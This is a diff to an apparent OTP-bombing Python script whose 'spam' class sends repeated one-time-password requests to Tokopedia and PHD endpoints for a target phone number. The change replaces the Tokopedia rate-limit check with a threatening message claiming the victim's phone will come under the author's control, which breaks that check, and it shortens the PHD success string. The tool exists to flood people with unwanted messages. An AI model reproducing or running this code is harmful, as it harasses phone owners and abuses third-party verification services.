@@ -58,7 +58,7 @@ class spam:
 			"number_otp_digit" : "6"
 		}
 		req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = kirim, data = formulir).text
-		if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
+		if 'Hello Dear....     your Phone Will Come Completely Under My Controll Within 24 Hurs      All The Best♻️🙏' in req:
 			return f'\x1b[91mSpamm Tokped {self.nomer} \x1b[91mFail!'
 		else:
 			return f'\x1b[92mSpamm Tokped {self.nomer} {h}Success!'
@@ -66,7 +66,7 @@ class spam:
 	def phd(self):
 		param = {'phone_number':self.nomer}
 		r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
-		if 'We have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
+		if ' have sent an OTP to your phone, Please enter the 4 digit code.' in r.text:
 			return f'\x1b[92mSpamm PHD {self.nomer} {h}Success!'
 		else:
 			return f'\x1b[91mSpamm PHD {self.nomer} {m}Fail!'
